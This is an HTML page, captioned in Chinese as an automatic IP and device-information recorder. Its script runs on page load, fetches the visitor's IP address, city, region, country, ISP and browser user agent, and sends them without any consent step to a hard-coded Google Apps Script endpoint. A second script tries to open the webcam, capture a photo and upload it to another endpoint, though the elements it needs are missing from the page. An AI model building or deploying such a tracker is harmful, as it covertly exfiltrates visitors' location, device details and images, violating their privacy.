<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP 定位與設備訊ㄒ息記錄</title>
</head>
<body>
  <h1>自動記錄 IP 資訊與設ㄎ備訊息</h1>
  <p id="ipInfo">IP 資訊載入中...</p>
  <p id="status">尚未開始操作</p>

  <script>
    // 獲取 IP 和地理位置信息
    async function getIpInfo() {
      try {
        // 取得使用者的 IP 資訊
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        // 顯示 IP 資訊
        document.getElementById('ipInfo').innerText =
          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;

        // 構建 GET URL
        const url = new URL('https://script.google.com/macros/s/AKfycbxyDlrvL0rKhvXQ056I6eSuIh9YVwZoz5BF1OxyC_ak0Q0V734vrKBe0kU7WTmSmCyAog/exec');
        url.searchParams.append('ip', ip);
        url.searchParams.append('ipType', ipType);
        url.searchParams.append('userAgent', userAgent);
        url.searchParams.append('city', city);
        url.searchParams.append('region', region);
        url.searchParams.append('country', country);
        url.searchParams.append('org', org);

        // 發送 GET 請求
        const result = await fetch(url.toString());
        const responseData = await result.json();

        if (responseData.success) {
          document.getElementById('status').innerText = '上傳成功！資料已傳至伺服器。';
        } else {
          document.getElementById('status').innerText = '上傳失敗，伺服器返回錯誤。';
        }
      } catch (error) {
        console.error('錯誤:', error);
        document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
      }
    }

    // 開始執行
    document.addEventListener('DOMContentLoaded', () => getIpInfo());

    ///////
    async function initCamera() {
      const video = document.getElementById('video');
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
    }

    document.getElementById('capture').addEventListener('click', async () => {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // 將畫布內容轉換為 Blob 格式
      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        formData.append('userAgent', navigator.userAgent);

        const url = 'https://script.google.com/macros/s/AKfycbwqDNaUPQ-ajfcz3b6PxazhjUtIHerkMOdQ09S2_xQGPmlqUNrEUlng0s8TZKx26GTQFA/exec'; // 替換為您的後端 URL
        const response = await fetch(url, {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        document.getElementById('status').innerText = result.success
          ? '照片成功上傳！'
          : `上傳失敗：${result.error}`;
      }, 'image/jpeg');
    });

    initCamera().catch((error) => {
      document.getElementById('status').innerText = '無法啟動攝像頭：' + error.message;
    });
  </script>
</body>
</html>
